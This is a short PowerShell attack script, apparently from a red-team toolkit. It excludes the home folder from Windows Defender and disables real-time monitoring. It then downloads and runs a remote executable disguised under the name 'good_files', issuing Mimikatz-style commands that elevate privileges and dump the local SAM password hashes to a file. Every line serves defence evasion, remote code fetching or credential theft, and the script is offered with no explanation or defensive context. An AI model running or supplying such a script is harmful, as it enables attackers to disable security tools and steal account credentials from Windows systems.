Set-MpPreference -ExclusionPath ~
Write-Output "[+] Excluded Path from Windows Defender"

Set-MpPreference -DisableRealTimeMonitoring $true
Write-Output "[+] Disabled Windows Defender"

$url = "https://github.com/alekzandr/red/blob/master/good_files.zip?raw=true"
$output = "~\good_files_promise.zip"
Invoke-WebRequest -Uri $url -OutFile $output

Expand-Archive ~\good_files_promise.zip
Write-Output "[+] Good files downloaded and extracted"

Write-Output "[+] Pulling down hashes"
cd .\good_files_promise\x64

.\good_files.exe token::elevate lsadump::sam exit >> hashes.txt
mv hashes.txt ..\..\..\hashes.txt


